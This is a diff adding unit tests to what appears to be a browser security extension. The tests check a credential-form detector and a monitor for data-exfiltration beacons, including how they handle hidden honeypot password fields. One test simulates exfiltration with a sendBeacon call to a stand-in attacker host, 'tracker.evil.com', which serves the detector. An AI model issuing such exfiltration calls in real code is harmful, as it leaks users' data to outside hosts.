@@ -70,6 +70,32 @@ describe("formHasCredentialFields", () => {
     form.appendChild(div);
     expect(formHasCredentialFields(form)).toBe(true);
   });
+
+  // #859: inline-hidden honeypots must not count as credential fields, matching
+  // the shared hasVisiblePasswordField gate (#196).
+  it.each([
+    "display:none",
+    "visibility:hidden",
+  ])("returns false when the only password input is inline-hidden (%s)", (style) => {
+    document.body.innerHTML = `<form><input type="password" style="${style}"></form>`;
+    const form = document.querySelector("form") as HTMLFormElement;
+    expect(formHasCredentialFields(form)).toBe(false);
+  });
+
+  // #859: disabled fields are not submitted by the browser, so a form with only
+  // disabled password inputs cannot exfiltrate credentials (cf. #227.2).
+  it("returns false when the only password input is disabled", () => {
+    document.body.innerHTML = `<form><input type="password" disabled></form>`;
+    const form = document.querySelector("form") as HTMLFormElement;
+    expect(formHasCredentialFields(form)).toBe(false);
+  });
+
+  it("returns true when a visible field sits alongside a honeypot", () => {
+    document.body.innerHTML =
+      `<form><input type="password" style="display:none"><input type="password"></form>`;
+    const form = document.querySelector("form") as HTMLFormElement;
+    expect(formHasCredentialFields(form)).toBe(true);
+  });
 });
 
 describe("isCrossOriginUrl", () => {
@@ -708,6 +734,27 @@ describe("network exfiltration monitoring beacon", () => {
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
 
     navigator.sendBeacon("https://analytics.example.com/track", "data");
+
+    const beaconCalls = postSignal.mock.calls.filter(
+      (c) => c[0] === "ns-js-exfil-beacon"
+    );
+    expect(beaconCalls).toHaveLength(0);
+  });
+
+  // #859: a honeypot-only page must not count as a credential page, or every
+  // cross-origin analytics beacon scores +15 exfilBeacon on ordinary pageviews.
+  it.each([
+    "display:none",
+    "visibility:hidden",
+  ])("does not emit beacon signal when the only password field is inline-hidden (%s)", (style) => {
+    const postSignal = vi.fn<PostSignalFn>();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    document.body.innerHTML =
+      `<form><input type="password" style="${style}"></form>`;
+
+    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
+    expect(testBeacon).toHaveBeenCalledWith("https://tracker.evil.com/collect", "payload");
 
     const beaconCalls = postSignal.mock.calls.filter(
       (c) => c[0] === "ns-js-exfil-beacon"
